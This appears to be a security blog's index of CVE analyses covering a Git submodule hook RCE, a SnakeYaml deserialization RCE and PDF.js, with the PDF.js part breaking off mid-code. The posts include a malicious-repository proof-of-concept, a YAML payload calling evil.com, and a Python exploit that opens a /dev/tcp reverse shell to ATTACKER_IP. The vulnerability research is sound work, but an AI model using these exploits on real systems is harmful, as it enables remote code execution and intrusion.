
[{"content":"","date":"18 October 2024","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"18 October 2024","externalUrl":null,"permalink":"/authors/","section":"","summary":"","title":"","type":"authors"},{"content":"","date":"18 October 2024","externalUrl":null,"permalink":"/sharing/","section":"","summary":"","title":"","type":"sharing"},{"content":"","date":"18 October 2024","externalUrl":null,"permalink":"/sharing/cve/","section":"","summary":"","title":"","type":"sharing"},{"content":"","date":"18 October 2024","externalUrl":null,"permalink":"/tags/cve/","section":"Tags","summary":"","title":"Cve","type":"tags"},{"content":"","date":"18 October 2024","externalUrl":null,"permalink":"/series/cve-analysis/","section":"Series","summary":"","title":"CVE Analysis","type":"series"},{"content":"\rAnalysis CVE-2024-32002 (Git) #\rIntroduction #\rCVE-2024-32002: Git Remote Code Execution #\rA recently disclosed critical Git vulnerability could enable remote command injection.\nMalicious repositories with submodules can exploit a flaw in Git, tricking it into writing files outside of the submodule\u0026rsquo;s worktree and into the .git/ directory. This could result in the creation of a hook that executes during the clone process, without giving the user a chance to review the code being run.\nThe vulnerability only applies to Git versions prior to 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2 and 2.39.4, configured with symbolic link support and under case-insensitive operating systems.\nSeverity: Fundamentals #\rGit Introduction #\rGit is a distributed version control system designed to track changes in source code during software development. It allows multiple developers to collaborate on a project by managing changes to files and directories in a structured and efficient way.\nGit is fast. With Git, nearly all operations are performed locally, giving it a huge speed advantage on centralized systems that constantly have to communicate with a server somewhere.\nGit was built to work on the Linux kernel, meaning that it has had to effectively handle large repositories from day one. Git is written in C, reducing the overhead of runtimes associated with higher-level languages. Speed and performance has been a primary design goal of Git from the start.\nWith Git, you can:\nRecord changes to files (commits). Roll back to previous versions if needed. Work on different features or fixes simultaneously using branches. Merge changes from different branches or collaborators. Keep a history of who made what changes and when. Git is widely used in software development, and platforms like GitHub, GitLab, and Bitbucket are built on it to host repositories and facilitate collaboration. Symbolic Link (Symlink) #\rFrom linux symlink manual:\nSymbolic links are files that act as pointers to other files. \u0026hellip; A symbolic link is a special type of file whose contents are a string that is the pathname of another file, the file to which the link refers.\nIn short, a symbolic link (symlink) refers to a normal file but also contains additional metadata. These metadata will then make this file acts as a shortcut to another file. The purpose of symlink is to create multiples instances of a file without having to duplicate its content.\nA symlink can also acts as shortcut to another directory, which will links all the files and directories under the original directory to the symlink.\nSymlink in Git #\rIn Git, symlinks are treated as data files (with a special mode) that store the path to the original file/directory.\nWhen you clone a repository or checkout the branch containing a symlink, that reference gets converted to a symlink on the local filesystem.\nGit Submodules #\rSubmodules allow you to keep a Git repository as a subdirectory of another Git repository. This lets you clone another repository into your project and keep your commits separate.\nA submodule is a repository embedded inside another repository. This can help you to use another repo within your project. Sometimes it\u0026rsquo;s a public library from a third party developed or that\u0026rsquo;s just your library but you develop it separately. Example .gitmodules (configuration file that stores the mapping between the project’s URL and the local subdirectory you’ve pulled it into)\n[submodule \u0026#34;Example\u0026#34;]\rpath = ExampleSubmodule\rurl = https://github.com/example/ExampleSubmodule Hooks in Git #\rWhen first create or clone a repository (via git init or git clone), git will initialize a .git directory at the root of the working tree.\nThe directory tree of .git at first will be as follow:\n.git\r├── config\r├── HEAD\r├── hooks\r│ └── prepare-commit-msg.msample\r├── objects\r│ ├── info\r│ └── pack\r└── refs\r├── heads\r└── tags There\u0026rsquo;re alot of directories created, most of them contain information about the repository, configurations, references,\u0026hellip;\nFor now we only need to focus on the hooks directory. In the Git documentation about repository layout:\nHooks are customization scripts used by various Git commands. A handful of sample hooks are installed when git init is run, but all of them are disabled by default. To enable, the .sample suffix has to be removed from the filename by renaming. Read githooks[5] for more details about each hook. This directory is ignored if $GIT_COMMON_DIR is set and \u0026ldquo;$GIT_COMMON_DIR/hooks\u0026rdquo; will be used instead.\nIn short, Git hooks are small executables piece of code that are placed in the .git/hooks or .git/modules/module_type/module_name/hooks directory of a repository.\nWhen a file in this directory has no .sample suffix, the instructions in the file will get executed before or after a certain git action depending on the file name (pre-commit, post-commit, post-checkout,\u0026hellip;).\nVulnerability #\rPatch analysis #\rAmalmurali\u0026rsquo;s blog already deeply analyze the source code so from here I just read the source and the commit to analyze and explain by myself. From the commit:\nWhen creating a submodule path, we must be careful not to follow symbolic links. Otherwise we may follow a symbolic link pointing to a gitdir (which are valid symbolic links!) e.g. while cloning.\nOn case-insensitive filesystems, however, we blindly replace a directory that has been created as part of the clone operation with a symlink when the path to the latter differs only in case from the former\u0026rsquo;s path.\nLet\u0026rsquo;s simply avoid this situation by expecting not ever having to overwrite any existing file/directory/symlink upon cloning. That way, we won\u0026rsquo;t even replace a directory that we just created.\nThis addresses CVE-2024-32002.\nSo there are 2 files change to patch this CVE. One of them is submodule--helper.c which represent how git clone submodule works. It has new function dir_contains_only_dotgit.\nstatic int dir_contains_only_dotgit(const char *path) { DIR *dir = opendir(path); struct dirent *e; int ret = 1; if (!dir) return 0; e = readdir_skip_dot_and_dotdot(dir); if (!e) ret = 0; else if (strcmp(DEFAULT_GIT_DIR_ENVIRONMENT, e-\u0026gt;d_name) || (e = readdir_skip_dot_and_dotdot(dir))) { error(\u0026#34;unexpected item \u0026#39;%s\u0026#39; in \u0026#39;%s\u0026#39;\u0026#34;, e-\u0026gt;d_name, path); ret = 0; } closedir(dir); return ret; } This function allows directory that has . or .. and after that is a null terminator (that means the string is exactly . or ..). And also allows directory contains only a .git directory and then return 0 or 1 (which means true or false).\n#define DEFAULT_GIT_DIR_ENVIRONMENT \u0026#34;.git\u0026#34; dir.c\nstruct dirent *readdir_skip_dot_and_dotdot(DIR *dirp) { struct dirent *e; while ((e = readdir(dirp)) != NULL) { if (!is_dot_or_dotdot(e-\u0026gt;d_name)) break; } return e; } dir.h\nstatic inline int is_dot_or_dotdot(const char *name) { return (name[0] == \u0026#39;.\u0026#39; \u0026amp;\u0026amp; (name[1] == \u0026#39;\\0\u0026#39; || (name[1] == \u0026#39;.\u0026#39; \u0026amp;\u0026amp; name[2] == \u0026#39;\\0\u0026#39;))); } The clone_submodule function add the check that the submodule directory is existed and is empty or not. If not, it will clean up data and terminates the program and send an error message.\nif (clone_data-\u0026gt;require_init \u0026amp;\u0026amp; !stat(clone_data_path, \u0026amp;st) \u0026amp;\u0026amp; !dir_contains_only_dotgit(clone_data_path)) { char *dot_git = xstrfmt(\u0026#34;%s/.git\u0026#34;, clone_data_path); unlink(dot_git); free(dot_git); die(_(\u0026#34;directory not empty: \u0026#39;%s\u0026#39;\u0026#34;), clone_data_path); } Another file has changed is t7406-submodule-update.sh, after review this change, I assume this is a test case for Git\u0026rsquo;s submodule functionality, specifically ensuring that submodule paths do not follow symlinks. This can be used to reproduce the CVE.\ntest_expect_success CASE_INSENSITIVE_FS,SYMLINKS \\ \u0026#39;submodule paths must not follow symlinks\u0026#39; \u0026#39; # This is only needed because we want to run this in a self-contained # test without having to spin up an HTTP server; However, it would not # be needed in a real-world scenario where the submodule is simply # hosted on a public site. test_config_global protocol.file.allow always \u0026amp;\u0026amp; # Make sure that Git tries to use symlinks on Windows test_config_global core.symlinks true \u0026amp;\u0026amp; tell_tale_path=\u0026#34;$PWD/tell.tale\u0026#34; \u0026amp;\u0026amp; git init hook \u0026amp;\u0026amp; ( cd hook \u0026amp;\u0026amp; mkdir -p y/hooks \u0026amp;\u0026amp; write_script y/hooks/post-checkout \u0026lt;\u0026lt;-EOF \u0026amp;\u0026amp; echo HOOK-RUN \u0026gt;\u0026amp;2 echo hook-run \u0026gt;\u0026#34;$tell_tale_path\u0026#34; EOF git add y/hooks/post-checkout \u0026amp;\u0026amp; test_tick \u0026amp;\u0026amp; git commit -m post-checkout ) \u0026amp;\u0026amp; hook_repo_path=\u0026#34;$(pwd)/hook\u0026#34; \u0026amp;\u0026amp; git init captain \u0026amp;\u0026amp; ( cd captain \u0026amp;\u0026amp; git submodule add --name x/y \u0026#34;$hook_repo_path\u0026#34; A/modules/x \u0026amp;\u0026amp; test_tick \u0026amp;\u0026amp; git commit -m add-submodule \u0026amp;\u0026amp; printf .git \u0026gt;dotgit.txt \u0026amp;\u0026amp; git hash-object -w --stdin \u0026lt;dotgit.txt \u0026gt;dot-git.hash \u0026amp;\u0026amp; printf \u0026#34;120000 %s 0\\ta\\n\u0026#34; \u0026#34;$(cat dot-git.hash)\u0026#34; \u0026gt;index.info \u0026amp;\u0026amp; git update-index --index-info \u0026lt;index.info \u0026amp;\u0026amp; test_tick \u0026amp;\u0026amp; git commit -m add-symlink ) \u0026amp;\u0026amp; test_path_is_missing \u0026#34;$tell_tale_path\u0026#34; \u0026amp;\u0026amp; git clone --recursive captain hooked 2\u0026gt;err \u0026amp;\u0026amp; test_grep ! HOOK-RUN err \u0026amp;\u0026amp; test_path_is_missing \u0026#34;$tell_tale_path\u0026#34; \u0026#39; test_done Identifying the root cause #\rFrom the attacker perspective this is very interesting.\nIf we can somehow inject a hook script into .git/modules/module_type/module_name/hooks via a submodule, and when the main repository get cloned with the --recursive option, the submodule containing the hook script will get triggered.\nBut Git doesn\u0026rsquo;t allow a submodule to be placed inside .git. This is where symlink will come in handy.\nWhile Git support case sensitive file name, most OS file system don\u0026rsquo;t. We can add a symlink a that points to the .git directory and create a dummy directory of A/modules/x to place the hook repository as a submodule in our main repository. Then make a hook reposity consist of a directory y/hooks with a post-checkout hook script inside.\nWhen the victim clone this main repository, a symlink a (points to .git) will get created. Git will then proceed to clone the hook repository as a submodule, the path which this submodule will be place in is A/modules/x. But since the file system is case insensitive, the path will be resolved into .git/modules/x (thanks to the symlink) and the post-checkout hook is now in .git/modules/x/y/hooks.\nSuddenly everything go wrong by this chain of reaction. What a recipe for disaster!\nProof of Concept #\rI had modified the script from the testcase created by git and from some references for automately running PoC and victim can be exploited by just git clone our repository with option --recursive (checkout if submodules have any nested submodule)\n# Set Git configuration options git config --global protocol.file.allow always git config --global core.symlinks true git config --global init.defaultBranch main First needs to configure Git to always allow the file protocol, enables symlinks, and sets the default branch name to main (this option is to avoid warning message)\n# Define the repositories path hook_repo=\u0026#34;\u0026lt;YOUR_HOOK_REPOSITORY_LINK\u0026gt;\u0026#34; main_repo=\u0026#34;\u0026lt;YOUR_MAIN_REPOSITORY_LINK\u0026gt;\u0026#34; And then specifies the URLs for the hook and the main repositories.\n# Initialize the hook repository git clone \u0026#34;$hook_repo\u0026#34; hook cd hook mkdir -p fast/hooks Clones the hook repository and creates a directory.\n# Write the malicious code to a hook\rcat \u0026gt; fast/hooks/post-checkout \u0026lt;\u0026lt;EOF\r#!/bin/bash\recho \u0026#34;You have been hacked\u0026#34; \u0026gt; /tmp/hacked\rpowershell.exe -Command \u0026#34;Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show(\u0026#39;You have been hacked\u0026#39;, \u0026#39;Warning\u0026#39;, \u0026#39;OK\u0026#39;, \u0026#39;Warning\u0026#39;)\u0026#34;\rEOF Creates a post-checkout hook script that writes a malicious code into file. In here, I write a simple message box that display message You have been hacked using powershell command.\n# Make the hook executable chmod +x fast/hooks/post-checkout git add fast/hooks/post-checkout git commit -m \u0026#34;Add post-checkout hook\u0026#34; git push origin main The command chmod +x fast/hooks/post-checkout is used to make the post-checkout file executable. This ensures that the Git hook will run properly after the checkout action in Git. When files are cloned via Git, the file metadata, such as executable permissions, might not always be preserved across systems (especially in cases like Linux and macOS).\nAnd then add it to the repository, commit the change, and pushe it to the remote repository.\n# Add hook submodule to the main repository git clone \u0026#34;$main_repo\u0026#34; main cd main git submodule add --name query/fast \u0026#34;$hook_repo\u0026#34; Utils/modules/query git commit -m \u0026#34;Add query submodule\u0026#34; This will clone the main repository, add the hook repository as a submodule and commit the change.\n# Create a symlink printf \u0026#34;.git\u0026#34; \u0026gt; dotgit.txt git hash-object -w --stdin \u0026lt; dotgit.txt \u0026gt; dot-git.hash printf \u0026#34;120000 %s 0\\tutils\\n\u0026#34; \u0026#34;$(cat dot-git.hash)\u0026#34; \u0026gt; index.info git update-index --index-info \u0026lt; index.info git commit -m \u0026#34;Add utils\u0026#34; rm -rf dotgit.txt dot-git.hash index.info git push origin main cd .. Finally I create a symlink to the .git directory, add it to the Git index, commit the change, and push it to the remote repository.\nAnd then user clone with this payload will be injected.\ngit clone --recursive \u0026#34;\u0026lt;YOUR_MAIN_REPOSITORY_LINK\u0026gt;\u0026#34; PoC Video #\rMitigation \u0026amp; Remediation #\rTo address the vulnerability, it is crucial to update Git to one of the patched versions listed below:\n2.45.1 2.44.1 2.43.4 2.42.2 2.41.1 2.40.2 2.39.4 As an additional mitigation, you can disable symbolic links in Git by running the following command:\ngit config --global core.symlinks false References #\rhttps://nvd.nist.gov/vuln/detail/CVE-2024-32002 https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2024-32002 https://mirrors.edge.kernel.org/pub/software/scm/git/docs/gitsubmodules.html https://git-scm.com/book/en/v2/Git-Tools-Submodules https://www.tarlogic.com/blog/cve-2024-32002-vulnerability-git/ https://amalmurali.me/posts/git-rce/ https://blog.snapattack.com/detecting-cve-2024-32002-a641d4f6c502 https://github.com/amalmurali47/git_rce https://docs.antora.org/antora/latest/symlinks/ https://blog.meain.io/2023/what-is-in-dot-git/ ","date":"18 October 2024","externalUrl":null,"permalink":"/sharing/cve/cve-2024-32002/","section":"","summary":"Analysis for CVE-2024-32002 (Git)","title":"CVE-2024-32002 (Git)","type":"sharing"},{"content":"","date":"18 October 2024","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"18 October 2024","externalUrl":null,"permalink":"/tags/sharing/","section":"Tags","summary":"","title":"Sharing","type":"tags"},{"content":"","date":"18 October 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"\rAnalysis CVE-2022-1471 (SnakeYaml) #\rIntroduction #\rCVE-2022-1471 #\rThis is specific to SnakeYaml@1.33 and 1.32 versions. The vulnerability occurs when using the SnakeYaml “Constructor” directly, but not when using \u0026ldquo;SafeConstructor\u0026rdquo;.\nThe SnakeYaml library for Java is vulnerable to arbitrary code execution due to a flaw in its Constructor class. The class does not restrict which types can be deserialized, allowing an attacker to provide a malicious YAML file for deserialization and potentially exploit the system.\nSeverity: SnakeYaml #\rSnakeYAML is a popular Java library for parsing and emitting YAML (YAML Ain\u0026rsquo;t Markup Language) files. It allows Java applications to read and write YAML data, which is a human-readable format often used for configuration files or data exchange.\nSnakeYAML supports all versions of YAML and can handle complex data structures like mappings (dictionaries), sequences (lists), and scalar values (strings, numbers, \u0026hellip;).\nJava Deserialization #\rFirst I need to know the basic knowledge that What is Serialization and Deserialization?.\nSerialization is the process of converting a data structure or object into series of bytes that can be easily stored, transmitted, or persisted. The resulting serialized data is often in a standardized, platform-independent format, such as JSON, XML, or binary data. Deserialization is the reverse process of serialization, it converts series of bytes to objects or data structure. So why need these processes ? On low-level, especially when you want to send data over a network to another. You need to encode the data to compatible format. For this purpose, the object needs to be transformed into a byte stream.\nThe advantage of serialization and deserialization is that byte stream is platform-independent, which means after serializing the object on one platform, it can be converted back to the original state on any other platform.\nYAML Language #\rYAML is a human-readable data serialization language used for data storage and data exchange formats. Originally, YAML stands for Yet Another Markup Language, but then change to a recursive acronym stands for YAML Ain’t Markup Language. Not only YAML is used for writting configuration files and metadata but also be used to many data structures such as arrays, and dictionaries.\nBelow is an example of a simple YAML structure:\nname: John Cena alias: - Bing Chilling - Who? - You Can\u0026#39;t See Me age: 47 hometown: China occupations: - \u0026#34;1999–2025\u0026#34;: wrestler - \u0026#34;2002–2005\u0026#34;: rapper - \u0026#34;2006–present\u0026#34;: actor The YAML format mainly uses these three types:\nMapping: a map/dictionary-like type with each element is a pair of key-value type, and each key must be unique. Sequences: an array/list type structure Literals: string, number, boolean,\u0026hellip; type. Workflow #\rSnakeYaml vulnerability example code:\nYaml yaml = new Yaml(); File file = new File(\u0026#34;file.yaml\u0026#34;); InputStream inputStream = new FileInputStream(file); User user = yaml.load(inputStream); When you load a file yaml that can have untrusted user input. Without any input validation, you can get remote code execute from attacker.\nOne of existed features of SnakeYaml is its support for a special syntax that allows the constructor of any Java class to be called when parsing YAML data.\nBecause the input gets parsed to the generic Object.class, which is supertype of Object in Java and when Object is loaded into memory, any type can be used. This allows attacker using any gadget or gadget chain available in the classpath of the application.\nHow does the malicious YAML file looks like ? Vulnerable class example:\nclass VulnerableClass { public String command; public String toString() { return command; } } File YAML:\n!!VulnerableClass command: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [ \u0026#34;http://evil.com\u0026#34; ] ] ]] From the Oracle/OpenJDK standard library. This vulnerability allows remote code execution by exploiting the ability to load arbitrary classes from a remote class path. The !! syntax is being used to explicitly define the types for the objects being created in the YAML structure.\n!!VulnerableClass: This declares that the root object is of type VulnerableClass. !!javax.script.ScriptEngineManager: This indicates that the value of the command key should be treated as an instance of the javax.script.ScriptEngineManager class. !!java.net.URLClassLoader: This creates an instance of java.net.URLClassLoader. !!java.net.URL: This explicitly creates an instance of java.net.URL with the value http://evil.com. Which means this can make a request to http://evil.com. When i host a server and then receive the request from vulnerable app, it head to /META-INF/services/javax.script.ScriptEngineFactory. So what is it and how we can execute code. From this post:\nIt\u0026rsquo;s intended to store service provider configuration files.\nA Service provider is an implementation of a Service Provider Interface packaged as JAR.\nA Service loader discover and load all implementations declared in the service provider configuration file.\nA configuration file is a file named as the fully qualified name of the interface and its content is a list of fully qualified names of implementations.\nIn brief, /META-INF/services contain the service when we import class in Java. And the payload I send that will point to javax.script.ScriptEngineManager class.\nFrom this docs in oracle, It said that ScriptEngineManager simply return a string that use as a class name. So I can fake a class name which contains actual exploit which will perform remote code execution on the server.\nIn this situation, I write a string ExploitClass into ScriptEngineManager. But when I send request again, it said that ExploitClass.class is 404 not found.\nSo the last step is build ExploitClass.java and then using command javac to compile into file ExploitClass.class.\nProof of Concept #\rPoC script #\rFirst, you need to run this script in your machine, this will automately create ExploitClass and send the payload to the victim.\n#!/usr/bin/env python3 import requests import random import os import sys import base64 import threading import subprocess BASE_URL = \u0026#34;BASE_URL\u0026#34; ATTACKER_IP = \u0026#34;ATTACKER_IP\u0026#34; ATTACKER_PORT = \u0026#34;ATTACKER_PORT\u0026#34; REVSHELL_PORT = \u0026#34;REVSHELL_PORT\u0026#34; CMD = f\u0026#34;sh -i \u0026gt;\u0026amp; /dev/tcp/{ATTACKER_IP}/{REVSHELL_PORT} 0\u0026gt;\u0026amp;1\u0026#34; def payload(): data = f\u0026#34;\u0026#34;\u0026#34; !!com.example.snakeyaml.Student age: {random.randint(1, 100)} id: {random.randint(1000, 9999)} department: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\u0026#34;http://{ATTACKER_IP}:{ATTACKER_PORT}/\u0026#34;]]]] firstName: masa lastName: mune \u0026#34;\u0026#34;\u0026#34; headers = {\u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-yaml\u0026#34;} response = requests.post(BASE_URL, headers=headers, data=data) print(f\u0026#34;[+] Sending payload to {BASE_URL}\u0026#34;) def create_service(): os.makedirs(\u0026#34;./META-INF/services\u0026#34;, exist_ok=True) with open(\u0026#34;./META-INF/services/javax.script.ScriptEngineFactory\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(\u0026#34;ExploitClass\u0026#34;) print(\u0026#34;[+] Service created\u0026#34;) def create_java_file(): cmd = base64.b64encode(CMD.encode()).decode() with open(\u0026#34;ExploitClass.java\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write( f\u0026#34;\u0026#34;\u0026#34; import javax.script.ScriptEngine; import javax.script.ScriptEngineFactory; import java.io.File; import java.io.IOException; import java.util.List; public class ExploitClass implements ScriptEngineFactory {{ public ExploitClass() throws Exception {{ ProcessBuilder pb = new ProcessBuilder(\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;echo {cmd} | base64 -d | /bin/bash\u0026#34;).redirectErrorStream(true); try {{ Process p = pb.start(); p.waitFor(); p.destroy(); }} catch (Exception e) {{}} }} public String toString() {{ return \u0026#34;Exploit Successful!\u0026#34;; }} @Override public String getEngineName() {{ return null; }} @Override public String getEngineVersion() {{ return null; }} @Override public List\u0026lt;String\u0026gt; getExtensions() {{ return null; }} @Override public List\u0026lt;String\u0026gt; getMimeTypes() {{ return null; }} @Override public List\u0026lt;String\u0026gt; getNames() {{ return null; }} @Override public String getLanguageName() {{ return null; }} @Override public String getLanguageVersion() {{ return null; }} @Override public Object getParameter(String key) {{ return null; }} @Override public String getMethodCallSyntax(String obj, String m, String... args) {{ return null; }} @Override public String getOutputStatement(String toDisplay) {{ return null; }} @Override public String getProgram(String... statements) {{ return null; }} @Override public ScriptEngine getScriptEngine() {{ return null; }} }} \u0026#34;\u0026#34;\u0026#34; ) print(\u0026#34;[+] Java file created\u0026#34;) def compile_java_file(): os.system(\u0026#34;javac --release 11 ExploitClass.java\u0026#34;) print(\u0026#34;[+] Java file compiled\u0026#34;) def main(): # STEP 1: Create service create_service() # STEP 2: Create java file create_java_file() # STEP 3: Compile java file compile_java_file() # STEP 4: Send payload payload() if __name__ == \u0026#34;__main__\u0026#34;: main() And then listen in your machine to receive victim\u0026rsquo;s connection. You can using something like\nnc -lvnp port Video #\rMitigation #\rNIST recommend upgrading to version 2.0 and beyond. But when I review the latest source code of SnakeYaml, I think it still can be vulnurable. When you parse untrusted data, SnakeYaml can also be used in a safe way, by passing an instance of a SafeConstructor to the Yaml constructor.\nExample:\nYaml yaml = new Yaml(new SafeConstructor()); // Only allow whitelist of constructors.\rFile file = new File(\u0026#34;file.yaml\u0026#34;);\rInputStream inputStream = new FileInputStream(file);\rObject obj = yaml.load(inputStream); // Safe to use Or you can use SnakeYAML Engine. This also recommend by SnakeYaml in docs. Link: SnakeYaml CVE \u0026amp; NIST\nReferences #\rhttps://www.labs.greynoise.io/grimoire/2024-01-03-snakeyaml-deserialization/ https://snyk.io/blog/java-yaml-parser-with-snakeyaml/ https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/ https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in https://github.com/mbechler/marshalsec https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/ https://securitylab.github.com/resources/apache-struts-vulnerability-cve-2017-9805/ https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858 ","date":"15 September 2024","externalUrl":null,"permalink":"/sharing/cve/cve-2022-1471/","section":"","summary":"Analysis for CVE-2022-1471 (SnakeYaml)","title":"CVE-2022-1471 (SnakeYaml)","type":"sharing"},{"content":"\rAnalysis CVE-2024-4367 (PDF.js) #\rIntroduction #\rCVE-2024-4367: Arbitrary JavaScript execution in PDF.js #\rCVE-2024-4367 presents a critical vulnerability within the esteemed PDF.js library, widely embraced for its adeptness in rendering PDF files in web browsers.\nThis exploit enables adversaries to inject and execute arbitrary JavaScript code within a user\u0026rsquo;s browser context, catalyzing a perilous Cross-Site Scripting (XSS) scenario. This vulnerability affects Firefox \u0026lt; 126, Firefox ESR \u0026lt; 115.11, and Thunderbird \u0026lt; 115.11.\nSeverity:\nPDF.js #\rPDF.js is an open-source JavaScript library developed by Mozilla that allows you to display PDF files directly within a web browser without needing any external plugins like Adobe Reader. It essentially renders PDFs within a \u0026lt;canvas\u0026gt; element using HTML5 technologies, making it possible to view and interact with PDFs directly in the browser.\nKey features of PDF.js include:\nRendering PDF files: PDF.js converts PDF files into HTML5 canvas elements, allowing them to be displayed natively in modern web browsers. Cross-browser support: Since it\u0026rsquo;s based on HTML5, it works across all major browsers like Chrome, Firefox, Edge, and Safari. Customization: Developers can use PDF.js to build custom PDF viewers with their own UI, or integrate it into existing web applications. PDF.js is commonly used in two main scenarios.\nFirst, it\u0026rsquo;s the built-in PDF viewer in Firefox. If you\u0026rsquo;ve ever opened or downloaded a PDF file in Firefox, you\u0026rsquo;ve likely seen PDF.js at work. Second, it\u0026rsquo;s available as a Node module called pdfjs-dist, which is downloaded around 2.4 million times weekly via NPM. In this form, it enables websites to offer embedded PDF preview features, a functionality utilized by various platforms, including Git-hosting services and note-taking apps. Understanding a PDF file #\rPDF Components #\rObjects: PDF includes eight basic types of objects: Boolean values, Integer and Real numbers, Strings, Names, Arrays, Dictionaries, Streams, and the null object. File structure: describes how objects are organized in a PDF file for efficient random access and incremental update. Document structure: logical structure of the document, such as the arrangement of pages, chapters, sections, and other hierarchical elements within the PDF. Content stream: where the actual content of the PDF is stored, including the instructions for displaying text, images, and graphics on the page. PDF Text Representation #\rA character is an abstract symbol, whereas a glyph is a specific graphical shape rendering of a character and is subject to all graphical manipulations.\nPDF file has a special way to represent characters with glyphs from fonts. This allows PDF to describe, select and render glypths conveniently and efficiently.\nIn PDF, a font refers to the font dictionary. This font dictionary is a PDF object that contains information about the font.\nFor most font types, the font program is defined in a seperate font file, which is either embedded to the PDF file or obtain from external sources. This font program contains glyph descriptions used to generate glyphs.\nThis example illustrates the most straightforward use of a font: Detail:\nTo paint glyphs, a content stream shall first identify the font to be used. The Tf operator shall specify the name of a font resource that is, an entry in the Font subdictionary of the current resource dictionary. The value of that entry shall be a font dictionary. The font dictionary shall identify the font\u0026#39;s externally known name, such as Helvetica, and shall supply some additional information that the conforming reader needs to paint glyphs from that font. The font dictionary may provide the definition of the font program itself. Workflow #\rFunction Evaluation #\rWhen the application load the PDF file, it will render glyphs using an InternalRenderTask class. This class have a chain of function calls with _continue() -\u0026gt; _scheduleNext() -\u0026gt; _next().\nThe _next() method will call a method executeOperatorList().\nclass InternalRenderTask { ... async _next() { if (this.cancelled) { return; } this.operatorListIdx = this.gfx.executeOperatorList(this.operatorList, this.operatorListIdx, this._continueBound, this.stepper); ... } } In the executeOperatorList() method\nexecuteOperatorList(operatorList, executionStartIdx, continueCallback, stepper) { const argsArray = operatorList.argsArray; const fnArray = operatorList.fnArray; let i = executionStartIdx || 0; ... while (true) { ... fnId = fnArray[i]; if (fnId !== _util.OPS.dependency) { this[fnId].apply(this, argsArray[i]); } ... i++; ... } } This method will call the method at index fnID via apply() method. We can see the index of all predefined methods in the const OPS variable in the code.\nconst OPS = { dependency: 1, setLineWidth: 2, ... setTextMatrix: 42, nextLine: 43, showText: 44, showSpacedText: 45, nextLineShowText: 46, ... paintSolidColorImageMask: 90, constructPath: 91 }; And thanks to the magic of debugging, we can extract the values of the fnArray to find out which methods get called in the process. There\u0026rsquo;re 2 arrays passed into the executeOperatorList() method.\nWe only need to focus on the 1st array that contains number 44, the index of showText() method. This is the method that draws the glyphs on the page.\nWhen calling this method, it will then proceed to call the paintChar() method.\nshowText(glyphs) { const current = this.current; const font = current.font; ... for (i = 0; i \u0026lt; glyphsLength; ++i) { const glyph = glyphs[i]; ... if (this.contentVisible \u0026amp;\u0026amp; (glyph.isInFont || font.missingFile)) { if (simpleFillText \u0026amp;\u0026amp; !accent) { ctx.fillText(character, scaledX, scaledY); } else { this.paintChar(character, scaledX, scaledY, patternTransform); ... } } ... } ... } The paintChar() method declares a variable called addToPath, this is a variable of type Function. Its value gets generated by the call to font.getPathGenerator() which will then be evaluated.\npaintChar(character, x, y, patternTransform) { ... let addToPath; if (font.disableFontFace || isAddToPathSet || patternFill) { addToPath = font.getPathGenerator(this.commonObjs, character); } if (font.disableFontFace || patternFill) { ctx.save(); ctx.translate(x, y); ctx.beginPath(); addToPath(ctx, fontSize); // gets evaluated ... } ... } To optimize the performance of painting a glyph based on its description, a getPathGenerator() method is used. This is where our injected code will be passed in and generated into a function.\ngetPathGenerator(objs, character) { if (this.compiledGlyphs[character] !== undefined) { return this.compiledGlyphs[character]; } let cmds; try { cmds = objs.get(this.loadedName + \u0026#34;_path_\u0026#34; + character); } ... if (this.isEvalSupported \u0026amp;\u0026amp; _util.FeatureTest.isEvalSupported) { const jsBuf = []; for (const current of cmds) { const args = current.args !== undefined ? current.args.join(\u0026#34;,\u0026#34;) : \u0026#34;\u0026#34;; jsBuf.push(\u0026#34;c.\u0026#34;, current.cmd, \u0026#34;(\u0026#34;, args, \u0026#34;);\\n\u0026#34;); } return this.compiledGlyphs[character] = new Function(\u0026#34;c\u0026#34;, \u0026#34;size\u0026#34;, jsBuf.join(\u0026#34;\u0026#34;)); } ... } If isEvalSupported is enable (which it is by default), the method will return a new Object of class Function with the function body being the jsBuf which contains the instructions that make the glyph path.\nThis jsBuf is an array of javascript codes made from cmds, which is the compiled intructions for each glyph.\nBut how exactly are these cmd and args got generated?\nFont Compilation #\rWe know that the cmd and args are elements of an object in a cmds array, which is loaded from a variable objs with a glypth name being this.loadedName + \u0026quot;_path_\u0026quot; + character. An example of this would be g_d0_f1_path_.\nIf we trace back to the origin of this objs, which is this.commonObjs, we will see that it is resolved from the WorkerTransport class at messageHandler.on() with type \u0026ldquo;FontPath\u0026rdquo;.\nmessageHandler.on(\u0026#34;commonobj\u0026#34;, ([id, type, exportedData]) =\u0026gt; { if (this.destroyed) { return; } if (this.commonObjs.has(id)) { return; } switch (type) { ... case \u0026#34;FontPath\u0026#34;: case \u0026#34;Image\u0026#34;: this.commonObjs.resolve(id, exportedData); break; default: throw new Error(`Got unknown common object type ${type}`); } }); And when we trace further to where the data got sent to this messageHandler, eventually we will reach a buildFontPaths() method of PartialEvaluator class.\nstatic buildFontPaths(font, glyphs, handler, evaluatorOptions) { function buildPath(fontChar) { const glyphName = `${font.loadedName}_path_${fontChar}`; try { if (font.renderer.hasBuiltPath(fontChar)) { return; } handler.send(\u0026#34;commonobj\u0026#34;, [glyphName, \u0026#34;FontPath\u0026#34;, font.renderer.getPathJs(fontChar)]); } ... for (const glyph of glyphs) { buildPath(glyph.fontChar); const accent = glyph.accent; if (accent \u0026amp;\u0026amp; accent.fontChar) 